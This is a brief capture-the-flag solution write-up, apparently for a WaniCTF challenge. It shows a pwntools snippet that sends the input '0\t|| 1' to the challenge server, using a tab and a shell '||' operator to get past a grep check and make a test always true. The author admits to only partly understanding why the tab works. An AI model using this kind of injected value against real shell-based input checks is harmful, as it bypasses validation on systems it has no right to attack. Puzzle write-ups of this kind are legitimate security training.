## Solution

```python
r = remote("chal-lz56g6.wanictf.org", "7580")
r.sendline(f"0\t|| 1")

```

- `0` to pass the grep check
- `\t` to trick printf, not fully sure how it works but i saw in some testcase on busybox
- `|| 1` to make test always true
